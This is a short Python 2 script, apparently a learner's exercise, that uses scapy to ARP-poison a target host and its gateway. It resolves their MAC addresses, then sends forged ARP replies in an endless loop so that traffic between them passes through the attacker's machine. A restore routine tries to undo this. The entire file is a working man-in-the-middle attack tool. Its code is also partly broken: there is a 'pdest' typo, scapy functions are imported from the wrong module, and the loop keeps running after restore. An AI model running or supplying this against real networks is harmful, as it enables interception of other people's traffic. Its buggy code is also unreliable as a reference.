import os
import signal
from scapy.layers.inet import ARP, Ether, srp, send
import time



def get_mac(ip_address):
    # Send and receive packets at layer 2
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    # return the MAC address from a response
    for s, r in responses:
        return r[Ether].src

    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # FUN FUN
    poison_target = ARP()
    poison_target.op = 2 # IS AT
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    # If I dont specify hwsrc does it imply mine? where I'm sending the attack from?
    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    # we keep emitting these ARP requests in a loop to make sure the cache entries remain poisoned for the duration of the attack
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print "[*] ARP poison attack finished."
    return

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[*] Restoring target..."
    # using a different method to send (from the one above to poison target)
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdest=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)
    # signals the main thread to exit
    os.kill(os.getpid(), signal.SIGINT) # main? arent we restoring on the main thread?